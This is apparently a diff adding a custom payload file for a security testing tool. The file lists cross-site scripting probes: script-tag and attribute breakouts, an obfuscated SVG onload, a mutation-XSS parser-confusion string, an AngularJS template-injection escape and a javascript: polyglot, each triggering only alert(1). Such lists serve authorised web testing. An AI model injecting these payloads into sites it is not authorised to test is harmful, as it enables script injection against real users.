@@ -1,0 +1,8 @@
+# XPT custom payloads — one per line, '#' lines are comments.
+# These are lab-safe probe payloads (alert(1) / DOM markers only).
+<sVg OnLoAd=alert(1)>
+"><script>alert(1)</script>
+'-alert(1)-'
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
+{{constructor.constructor('alert(1)')()}}
+jaVasCript:/*-/*`/*\`/*'/*"/**/(alert(1))//
